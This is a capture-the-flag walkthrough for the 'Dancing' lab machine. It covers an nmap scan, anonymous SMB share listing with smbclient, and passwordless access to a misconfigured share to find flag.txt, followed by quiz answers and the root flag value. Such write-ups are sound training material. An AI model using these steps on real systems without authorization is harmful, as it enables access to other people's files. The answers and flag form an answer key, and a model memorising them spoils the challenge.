## Dancing

First try to see what ports are open or services are running: `sudo nmap -sV 10.129.1.12`

```
PORT    	STATE 		SERVICE       VERSION
135/tcp 	open  		msrpc         Microsoft Windows RPC
139/tcp 	open  		netbios-ssn   Microsoft Windows netbios-ssn
445/tcp 	open  		microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

List possible SMB shares, without using a password: `smbclient -L 10.129.1.12`              

Password for [WORKGROUP\sebastiaan]:
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk
```

Connect to SMB share that is misconfigured, so it can be done without password: `smbclient \\\\10.129.1.12\\WORKSHARES` 

Password for [WORKGROUP\sebastiaan]:

List directory's in the SMB share: `smb: \> ls`
```
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021
```

Traverse directory's, list files and found the flag.txt file.
```
smb: \> cd james.p
smb: \james.p\> ls
```
```
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021
```

## Screenshots

![pwnd Dancing.png](..%2Fmedia%2Fpwnd%20Dancing.png)

## Quiz Questions

What does the 3-letter acronym SMB stand for? 
- Server Message Block

What port does SMB use to operate at? 
- 445

What is the service name for port 445 that came up in our Nmap scan? 
- microsoft-ds

What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing? 
- -L

How many shares are there on Dancing? 
- 4

What is the name of the share we are able to access in the end with a blank password? 
- Workshares

What is the command we can use within the SMB shell to download the files we find? 
- get

Root flag
- 5f61c10dffbc77a704d76016a22f1664 
